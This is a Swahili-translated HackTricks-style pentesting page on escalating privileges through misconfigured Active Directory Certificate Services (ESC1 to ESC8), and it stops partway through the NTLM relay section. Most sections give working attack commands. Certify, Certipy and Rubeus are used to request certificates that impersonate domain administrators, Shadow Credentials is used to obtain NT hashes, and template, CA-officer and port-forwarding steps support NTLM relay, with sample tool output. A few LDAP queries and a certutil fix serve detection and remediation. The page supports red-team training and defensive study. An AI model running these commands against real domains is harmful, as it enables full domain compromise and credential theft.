# AD CS Domain Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Hii ni muhtasari wa sehemu za mbinu za kupandisha hadhi za machapisho:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

* **Haki za kujiandikisha zinatolewa kwa watumiaji wenye mamlaka ya chini na CA ya Enterprise.**
* **Idhini ya meneja haitahitajika.**
* **Saini kutoka kwa wafanyakazi walioidhinishwa hazihitajiki.**
* **Maelezo ya usalama kwenye templeti za cheti ni ya kupita kiasi, yanaruhusu watumiaji wenye mamlaka ya chini kupata haki za kujiandikisha.**
* **Templeti za cheti zimewekwa ili kufafanua EKUs zinazosaidia uthibitishaji:**
* Vitambulisho vya Matumizi ya Funguo vya Kupanua (EKU) kama Uthibitishaji wa Mteja (OID 1.3.6.1.5.5.7.3.2), Uthibitishaji wa Mteja wa PKINIT (1.3.6.1.5.2.3.4), Kuingia kwa Kadi ya Smart (OID 1.3.6.1.4.1.311.20.2.2), Malengo Yoyote (OID 2.5.29.37.0), au hakuna EKU (SubCA) zinajumuishwa.
* **Uwezo wa waombaji kujumuisha subjectAltName katika Ombi la Kusaini Cheti (CSR) unaruhusiwa na templeti:**
* Active Directory (AD) inapa kipaumbele subjectAltName (SAN) katika cheti kwa uthibitishaji wa utambulisho ikiwa ipo. Hii inamaanisha kwamba kwa kutaja SAN katika CSR, cheti kinaweza kuombwa kuiga mtumiaji yeyote (mfano, msimamizi wa kikoa). Ikiwa SAN inaweza kutajwa na muombaji inaonyeshwa katika kitu cha AD cha templeti ya cheti kupitia mali ya `mspki-certificate-name-flag`. Mali hii ni bitmask, na uwepo wa bendera ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` inaruhusu kutajwa kwa SAN na muombaji.

{% hint style="danger" %}
Mipangilio iliyoelezewa inaruhusu watumiaji wenye mamlaka ya chini kuomba vyeti vyovyote vya SAN wanavyotaka, na kuwezesha uthibitishaji kama kiongozi yeyote wa kikoa kupitia Kerberos au SChannel.
{% endhint %}

Kipengele hiki wakati mwingine kinawashwa ili kusaidia uzalishaji wa cheti za HTTPS au mwenyeji kwa bidhaa au huduma za usambazaji, au kutokana na ukosefu wa uelewa.

Imepangwa kwamba kuunda cheti na chaguo hili kunasababisha onyo, ambayo si hali wakati templeti ya cheti iliyopo (kama templeti ya `WebServer`, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` iliyoanzishwa) inakopiwa na kisha kubadilishwa ili kujumuisha OID ya uthibitishaji.

### Abuse

Ili **kupata templeti za cheti zenye udhaifu** unaweza kukimbia:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Ili **kutumia udhaifu huu kujifanya kuwa msimamizi** mtu anaweza kukimbia:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Kisha unaweza kubadilisha **cheti kilichozalishwa kuwa muundo wa `.pfx`** na kukitumia **kujiandikisha kwa kutumia Rubeus au certipy** tena:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
The Windows binaries "Certreq.exe" & "Certutil.exe" zinaweza kutumika kuunda PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Uhesabu wa mifano ya vyeti ndani ya schema ya usanidi wa AD Forest, haswa zile zisizohitaji idhini au saini, zikiwa na Uthibitishaji wa Mteja au Smart Card Logon EKU, na zikiwa na bendera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` iliyoanzishwa, zinaweza kufanywa kwa kukimbia uchunguzi ufuatao wa LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

Hali ya pili ya unyanyasaji ni toleo la ya kwanza:

1. Haki za kujiandikisha zinatolewa kwa watumiaji wenye mamlaka ya chini na Enterprise CA.
2. Hitaji la idhini ya meneja limeondolewa.
3. Hitaji la saini zilizoidhinishwa limeachwa.
4. Maelezo ya usalama yaliyo na ruhusa nyingi kwenye kiolezo cha cheti yanatoa haki za kujiandikisha kwa watumiaji wenye mamlaka ya chini.
5. **Kiolezo cha cheti kimewekwa kujumuisha Any Purpose EKU au hakuna EKU.**

**Any Purpose EKU** inaruhusu cheti kupatikana na mshambuliaji kwa **kila kusudi**, ikiwa ni pamoja na uthibitishaji wa mteja, uthibitishaji wa seva, saini ya msimbo, n.k. Mbinu ile ile **iliyotumika kwa ESC3** inaweza kutumika kutekeleza hali hii.

Vyeti vyenye **hakuna EKUs**, ambavyo vinatumika kama vyeti vya CA vya chini, vinaweza kutumika kwa **kila kusudi** na vinaweza **pia kutumika kusaini vyeti vipya**. Hivyo, mshambuliaji anaweza kubainisha EKUs au maeneo yasiyo na mipaka katika vyeti vipya kwa kutumia cheti cha CA cha chini.

Hata hivyo, vyeti vipya vilivyoundwa kwa **uthibitishaji wa kikoa** havitafanya kazi ikiwa CA ya chini haitakubaliwa na **`NTAuthCertificates`** kitu, ambacho ni mipangilio ya default. Hata hivyo, mshambuliaji bado anaweza kuunda **vyeti vipya vyenye EKU yoyote** na thamani za cheti zisizo na mipaka. Hizi zinaweza **kutumika vibaya** kwa anuwai ya malengo (mfano, saini ya msimbo, uthibitishaji wa seva, n.k.) na zinaweza kuwa na athari kubwa kwa programu nyingine katika mtandao kama SAML, AD FS, au IPSec.

Ili kuorodhesha mifano inayolingana na hali hii ndani ya mpangilio wa AD Forest, swali lifuatalo la LDAP linaweza kufanywa:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

Hali hii ni kama ya kwanza na ya pili lakini **inatumia** **EKU tofauti** (Wakala wa Ombi la Cheti) na **mifano 2 tofauti** (hivyo ina seti 2 za mahitaji),

**Wakala wa Ombi la Cheti EKU** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Wakala wa Usajili** katika nyaraka za Microsoft, inaruhusu kiongozi **kujiandikisha** kwa **cheti** kwa **niaba ya mtumiaji mwingine**.

**“wakala wa usajili”** anajiandikisha katika **mifano** kama hiyo na anatumia **cheti kilichosainiwa kwa pamoja kuwasilisha CSR kwa niaba ya mtumiaji mwingine**. Kisha **anatumia** **CSR iliyosainiwa kwa pamoja** kwa CA, akijiandikisha katika **mfano** ambao **unaruhusu “kujiandikisha kwa niaba ya”**, na CA inajibu kwa **cheti inayomilikiwa na “mtumiaji mwingine”**.

**Mahitaji 1:**

* Haki za usajili zinatolewa kwa watumiaji wenye mamlaka ya chini na CA ya Enterprise.
* Mahitaji ya idhini ya meneja yameondolewa.
* Hakuna mahitaji ya saini zilizoidhinishwa.
* Maelezo ya usalama ya mfano wa cheti ni ya kupitiliza, ikitoa haki za usajili kwa watumiaji wenye mamlaka ya chini.
* Mfano wa cheti unajumuisha Wakala wa Ombi la Cheti EKU, ikiruhusu ombi la mifano mingine ya cheti kwa niaba ya viongozi wengine.

**Mahitaji 2:**

* CA ya Enterprise inatoa haki za usajili kwa watumiaji wenye mamlaka ya chini.
* Idhini ya meneja inakwepa.
* Toleo la muundo wa mfano ni 1 au linazidi 2, na linaelezea Mahitaji ya Sera ya Maombi ambayo yanahitaji Wakala wa Ombi la Cheti EKU.
* EKU iliyofafanuliwa katika mfano wa cheti inaruhusu uthibitisho wa kikoa.
* Vikwazo kwa wakala wa usajili havitumiki kwenye CA.

### Abuse

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kutekeleza hali hii:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **watumiaji** ambao wanaruhusiwa **kupata** **cheti cha wakala wa kujiandikisha**, mifano ambayo wakala wa kujiandikisha **wanaruhusiwa** kujiandikisha, na **akaunti** ambazo wakala wa kujiandikisha anaweza kufanya kazi kwa niaba yake zinaweza kudhibitiwa na CAs za biashara. Hii inafikiwa kwa kufungua `certsrc.msc` **snap-in**, **kubonyeza kulia kwenye CA**, **kubonyeza Mali**, na kisha **kuhamia** kwenye tab ya “Wakala wa Kujiandikisha”.

Hata hivyo, inabainishwa kwamba mipangilio ya **kawaida** kwa CAs ni “**Usizuilie wakala wa kujiandikisha**.” Wakati kizuizi juu ya wakala wa kujiandikisha kinawashwa na wasimamizi, kuweka kwenye “Zuilia wakala wa kujiandikisha,” usanidi wa kawaida unabaki kuwa wa kuruhusu sana. Inaruhusu **Kila mtu** kupata kujiandikisha katika mifano yote kama mtu yeyote.

## Udhibiti wa Upatikanaji wa Mifano ya Cheti Inayoweza Kuathiriwa - ESC4

### **Maelezo**

**Maelezo ya usalama** kwenye **mifano ya cheti** yanaelezea **idhini** maalum ambazo **mashirika ya AD** yanaweza kuwa nayo kuhusu mfano huo.

Iwapo **mshambuliaji** ana idhini zinazohitajika **kubadilisha** **mfano** na **kuanzisha** mabadiliko yoyote **yanayoweza kutumika** yaliyotajwa katika **sehemu za awali**, kupandishwa vyeo kunaweza kuwezesha.

Idhini muhimu zinazohusiana na mifano ya cheti ni pamoja na:

* **Mmiliki:** Inatoa udhibiti wa kimya juu ya kitu, ikiruhusu mabadiliko ya sifa zozote.
* **FullControl:** Inaruhusu mamlaka kamili juu ya kitu, ikiwa ni pamoja na uwezo wa kubadilisha sifa zozote.
* **WriteOwner:** Inaruhusu kubadilisha mmiliki wa kitu kuwa shirika chini ya udhibiti wa mshambuliaji.
* **WriteDacl:** Inaruhusu marekebisho ya udhibiti wa upatikanaji, huenda ikampa mshambuliaji FullControl.
* **WriteProperty:** Inaruhusu kuhariri sifa zozote za kitu.

### Unyanyasaji

Mfano wa privesc kama wa awali:

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ni wakati mtumiaji ana haki za kuandika juu ya mfano wa cheti. Hii inaweza kwa mfano kutumika vibaya kubadilisha usanidi wa mfano wa cheti ili kufanya mfano huo uweze kuathiriwa na ESC1.

Kama tunavyoona katika njia hapo juu, ni `JOHNPC` pekee mwenye haki hizi, lakini mtumiaji wetu `JOHN` ana kiunganishi kipya cha `AddKeyCredentialLink` kwa `JOHNPC`. Kwa kuwa mbinu hii inahusiana na vyeti, nimeanzisha shambulio hili pia, ambalo linajulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hapa kuna muonekano mdogo wa amri ya `shadow auto` ya Certipy ili kupata hash ya NT ya mwathirika.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** inaweza kubadilisha usanidi wa kiolezo cha cheti kwa amri moja. Kwa **kawaida**, Certipy itabadilisha usanidi ili kuufanya **kuwa na udhaifu kwa ESC1**. Tunaweza pia kubainisha **`-save-old` parameter ili kuhifadhi usanidi wa zamani**, ambayo itakuwa muhimu kwa **kurejesha** usanidi baada ya shambulio letu.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

Mtandao mpana wa uhusiano wa ACL, ambao unajumuisha vitu kadhaa zaidi ya templeti za cheti na mamlaka ya cheti, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Vitu hivi, ambavyo vinaweza kuathiri usalama kwa kiasi kikubwa, vinajumuisha:

* Kitu cha kompyuta cha AD cha seva ya CA, ambacho kinaweza kuathiriwa kupitia mitambo kama S4U2Self au S4U2Proxy.
* Seva ya RPC/DCOM ya seva ya CA.
* Kila kitu cha AD au kontena kilichoko ndani ya njia maalum ya kontena `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini sio tu, kontena na vitu kama vile kontena za Templeti za Cheti, kontena za Mamlaka ya Uthibitishaji, kitu cha NTAuthCertificates, na Kontena za Huduma za Usajili.

Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa mshambuliaji mwenye mamlaka ya chini atafanikiwa kupata udhibiti wa yoyote ya vipengele hivi muhimu.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

Mada inayozungumziwa katika [**post ya CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za **`EDITF_ATTRIBUTESUBJECTALTNAME2`** kama ilivyoelezwa na Microsoft. Mipangilio hii, inapowashwa kwenye Mamlaka ya Uthibitishaji (CA), inaruhusu kuingiza **maadili yaliyofafanuliwa na mtumiaji** katika **jina mbadala la somo** kwa **ombwe lolote**, ikiwa ni pamoja na yale yanayojengwa kutoka Active Directory®. Kwa hivyo, kipengele hiki kinawaruhusu **wavamizi** kujiandikisha kupitia **templeti yoyote** iliyowekwa kwa ajili ya **uthibitishaji** wa kikoa—hasa zile zilizo wazi kwa usajili wa mtumiaji **asiye na mamlaka**, kama vile templeti ya kawaida ya Mtumiaji. Kama matokeo, cheti kinaweza kulindwa, na kumwezesha mhamasishaji kuthibitisha kama msimamizi wa kikoa au **kitu kingine chochote kilichopo** ndani ya kikoa.

**Note**: Njia ya kuongezea **majina mbadala** katika Ombi la Kusaini Cheti (CSR), kupitia hoja `-attrib "SAN:"` katika `certreq.exe` (inayojulikana kama “Name Value Pairs”), ina **tofauti** na mkakati wa unyakuzi wa SANs katika ESC1. Hapa, tofauti iko katika **jinsi taarifa za akaunti zinavyofungwa**—ndani ya sifa ya cheti, badala ya nyongeza.

### Abuse

Ili kuthibitisha ikiwa mipangilio imewashwa, mashirika yanaweza kutumia amri ifuatayo na `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Hii operesheni kimsingi inatumia **ufikiaji wa rejista ya mbali**, hivyo, njia mbadala inaweza kuwa:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools like [**Certify**](https://github.com/GhostPack/Certify) and [**Certipy**](https://github.com/ly4k/Certipy) wana uwezo wa kugundua makosa haya ya usanidi na kuyatumia:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Ili kubadilisha mipangilio hii, ikiwa mtu ana **haki za usimamizi wa kikoa** au sawa, amri ifuatayo inaweza kutekelezwa kutoka kwa kituo chochote cha kazi:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Ili kuzima usanidi huu katika mazingira yako, bendera inaweza kuondolewa kwa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Baada ya sasisho za usalama za Mei 2022, **vyeti** vilivyotolewa hivi karibuni vitakuwa na **kiendelezi cha usalama** ambacho kinajumuisha **sifa ya `objectSid` ya ombaaji**. Kwa ESC1, SID hii inatokana na SAN iliyoainishwa. Hata hivyo, kwa **ESC6**, SID inakidhi **`objectSid` ya ombaaji**, si SAN.\
Ili kutumia ESC6, ni muhimu kwa mfumo kuwa na udhaifu kwa ESC10 (Mifumo ya Vyeti Dhaifu), ambayo inapa kipaumbele **SAN kuliko kiendelezi kipya cha usalama**.
{% endhint %}

## Udhibiti wa Upatikanaji wa Mamlaka ya Vyeti - ESC7

### Shambulio 1

#### Maelezo

Udhibiti wa upatikanaji wa mamlaka ya cheti unadumishwa kupitia seti ya ruhusa zinazodhibiti vitendo vya CA. Ruhusa hizi zinaweza kuonekana kwa kufikia `certsrv.msc`, kubonyeza kulia CA, kuchagua mali, na kisha kuhamia kwenye tab ya Usalama. Zaidi ya hayo, ruhusa zinaweza kuorodheshwa kwa kutumia moduli ya PSPKI na amri kama:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hii inatoa mwanga juu ya haki za msingi, yaani **`ManageCA`** na **`ManageCertificates`**, zinazohusiana na majukumu ya "meneja wa CA" na "Meneja wa Cheti" mtawalia.

#### Abuse

Kuwa na haki za **`ManageCA`** kwenye mamlaka ya cheti kunamuwezesha mtumiaji kubadilisha mipangilio kwa mbali kwa kutumia PSPKI. Hii inajumuisha kubadilisha bendera ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu spesifikesheni ya SAN katika kigezo chochote, jambo muhimu katika kupandisha ngazi ya domain.

Rahisishaji wa mchakato huu unaweza kufikiwa kupitia matumizi ya cmdlet ya PSPKI **Enable-PolicyModuleFlag**, inayoruhusu mabadiliko bila mwingiliano wa moja kwa moja wa GUI.

Kuwa na haki za **`ManageCertificates`** kunarahisisha idhini ya maombi yanayosubiri, kwa ufanisi ikiepuka kinga ya "idhini ya meneja wa cheti cha CA".

Mchanganyiko wa moduli za **Certify** na **PSPKI** unaweza kutumika kuomba, kuidhinisha, na kupakua cheti:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

{% hint style="warning" %}
Katika **shambulio la awali** **`Manage CA`** ruhusa zilitumika **kuwezesha** bendera ya **EDITF\_ATTRIBUTESUBJECTALTNAME2** ili kutekeleza **ESC6 attack**, lakini hii haitakuwa na athari yoyote hadi huduma ya CA (`CertSvc`) irejelewe. Wakati mtumiaji ana haki ya `Manage CA`, mtumiaji pia anaruhusiwa **kuanzisha huduma tena**. Hata hivyo, **haitoi maana kwamba mtumiaji anaweza kuanzisha huduma hiyo kwa mbali**. Zaidi ya hayo, E**SC6 huenda isifanye kazi moja kwa moja** katika mazingira mengi yaliyorekebishwa kutokana na masasisho ya usalama ya Mei 2022.
{% endhint %}

Hivyo, shambulio lingine linawasilishwa hapa.

Mahitaji:

* Tu **`ManageCA` ruhusa**
* **`Manage Certificates`** ruhusa (inaweza kutolewa kutoka **`ManageCA`**)
* Kigezo cha cheti **`SubCA`** lazima kiwe **kimewezeshwa** (inaweza kuwezeshwa kutoka **`ManageCA`**)

Teknolojia hii inategemea ukweli kwamba watumiaji wenye haki ya `Manage CA` _na_ `Manage Certificates` wanaweza **kutoa maombi ya cheti yaliyoshindwa**. Kigezo cha cheti **`SubCA`** ni **dhaifu kwa ESC1**, lakini **ni wasimamizi pekee** wanaoweza kujiandikisha katika kigezo hicho. Hivyo, **mtumiaji** anaweza **kuomba** kujiandikisha katika **`SubCA`** - ambayo itakataliwa - lakini **kisha itatolewa na meneja baadaye**.

#### Abuse

Unaweza **kujiwezesha ruhusa ya `Manage Certificates`** kwa kuongeza mtumiaji wako kama afisa mpya.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
The **`SubCA`** template inaweza **kuiwezesha kwenye CA** kwa kutumia parameter ya `-enable-template`. Kwa kawaida, template ya `SubCA` imewezesha.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ikiwa tumekamilisha masharti ya awali kwa shambulio hili, tunaweza kuanza kwa **kuomba cheti kulingana na kiolezo cha `SubCA`**.

**Omba hii itakataliwa**, lakini tutahifadhi funguo binafsi na kuandika chini kitambulisho cha ombi.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Kwa **`Manage CA` na `Manage Certificates`**, tunaweza kisha **kutoa ombi la cheti lililoshindwa** kwa kutumia amri ya `ca` na parameter ya `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na hatimaye, tunaweza **kurejesha cheti kilichotolewa** kwa kutumia amri ya `req` na parameter ya `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

{% hint style="info" %}
Katika mazingira ambapo **AD CS imewekwa**, ikiwa **kituo cha kujiandikisha mtandaoni kilicho hatarini** kinapatikana na angalau **kigezo kimoja cha cheti kimechapishwa** kinachoruhusu **kujiandikisha kwa kompyuta za kikoa na uthibitishaji wa mteja** (kama vile kigezo cha **`Machine`** cha kawaida), inakuwa inawezekana kwa **kompyuta yoyote yenye huduma ya spooler inayofanya kazi kuathiriwa na mshambuliaji**!
{% endhint %}

Mbinu kadhaa za **kujiandikisha zinazotumia HTTP** zinasaidiwa na AD CS, zinazopatikana kupitia majukumu ya ziada ya seva ambayo wasimamizi wanaweza kuweka. Mifumo hii ya kujiandikisha kwa cheti inayotumia HTTP inakabiliwa na **shambulio la NTLM relay**. Mshambuliaji, kutoka kwa **kompyuta iliyoathiriwa, anaweza kujifanya kuwa akaunti yoyote ya AD inayothibitishwa kupitia NTLM ya ndani**. Wakati wa kujifanya kuwa akaunti ya mwathirika, mifumo hii ya mtandao inaweza kufikiwa na mshambuliaji ili **kuomba cheti cha uthibitishaji wa mteja kwa kutumia kigezo cha cheti cha `User` au `Machine`**.

* **Mifumo ya kujiandikisha mtandaoni** (programu ya zamani ya ASP inayopatikana kwenye `http://<caserver>/certsrv/`), inatumia HTTP pekee, ambayo haina ulinzi dhidi ya shambulio la NTLM relay. Zaidi ya hayo, inaruhusu tu uthibitishaji wa NTLM kupitia kichwa chake cha HTTP cha Uidhinishaji, na kufanya mbinu za uthibitishaji salama zaidi kama Kerberos zisifae.
* **Huduma ya Kujiandikisha kwa Cheti** (CES), **Sera ya Kujiandikisha kwa Cheti** (CEP) Web Service, na **Huduma ya Kujiandikisha kwa Vifaa vya Mtandao** (NDES) kwa kawaida zinasaidia uthibitishaji wa negotiate kupitia kichwa chao cha HTTP cha Uidhinishaji. Uthibitishaji wa negotiate **unasaidia wote** Kerberos na **NTLM**, ikimruhusu mshambuliaji **kushuka hadi NTLM** uthibitishaji wakati wa shambulio la relay. Ingawa huduma hizi za mtandao zinawezesha HTTPS kwa kawaida, HTTPS pekee **haiwezi kulinda dhidi ya shambulio la NTLM relay**. Ulinzi kutoka kwa shambulio la NTLM relay kwa huduma za HTTPS unaweza kupatikana tu wakati HTTPS inachanganywa na uhusiano wa channel binding. Kwa bahati mbaya, AD CS haizindui Ulinzi wa Kupanuliwa kwa Uthibitishaji kwenye IIS, ambayo inahitajika kwa channel binding.

Tatizo la kawaida na shambulio la NTLM relay ni **muda mfupi wa vikao vya NTLM** na kutoweza kwa mshambuliaji kuingiliana na huduma zinazohitaji **saini ya NTLM**.

Hata hivyo, kikomo hiki kinashindwa kwa kutumia shambulio la NTLM relay kupata cheti kwa mtumiaji, kwani kipindi cha uhalali wa cheti kinadhibiti muda wa kikao, na cheti kinaweza kutumika na huduma zinazohitaji **saini ya NTLM**. Kwa maelekezo juu ya kutumia cheti kilichoporwa, rejelea:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Kikomo kingine cha shambulio la NTLM relay ni kwamba **kompyuta inayodhibitiwa na mshambuliaji lazima ithibitishwe na akaunti ya mwathirika**. Mshambuliaji anaweza kusubiri au kujaribu **kulazimisha** uthibitishaji huu:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` inataja **kituo cha HTTP AD CS kilichowezeshwa**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Mali ya `msPKI-Enrollment-Servers` inatumika na Mamlaka ya Vyeti ya biashara (CAs) kuhifadhi mwisho wa Huduma ya Usajili wa Vyeti (CES). Mwisho hawa wanaweza kuchambuliwa na kuorodheshwa kwa kutumia chombo **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### Unyanyasaji kwa kutumia Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

